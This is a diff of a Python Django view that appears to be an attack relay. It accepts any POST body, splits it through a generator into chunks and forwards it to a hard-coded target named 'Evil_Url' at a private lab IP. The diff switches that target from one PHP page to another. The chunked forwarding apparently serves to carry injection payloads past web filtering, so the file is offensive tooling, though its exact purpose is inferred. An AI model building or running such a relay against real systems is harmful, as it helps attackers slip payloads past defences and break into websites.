@@ -1,7 +1,7 @@
 from django.shortcuts import HttpResponse
 import requests
 
-Evil_Url = 'http://192.168.32.144/2.php'
+Evil_Url = 'http://192.168.32.144/3.php'
 Host = '192.168.32.144'
 
 Headers = {
@@ -29,7 +29,7 @@ def gen(payload):
     yield bytes(pay_list[1],encoding='utf8')
     yield bytes(pay_list[2],encoding='utf8')
 
-def get_response(domain,payload):
+def get_response(payload):
     r = requests.post(Evil_Url,data=gen(payload),headers=Headers)
     return r.text
 
@@ -37,6 +37,6 @@ def main(request):
     if request.method == 'POST':
         payload = str(request.body)
         print(payload)
-        return HttpResponse(get_response('192.168.32.144',payload))
+        return HttpResponse(get_response(payload))
     else:
         return HttpResponse('Only receive post data')
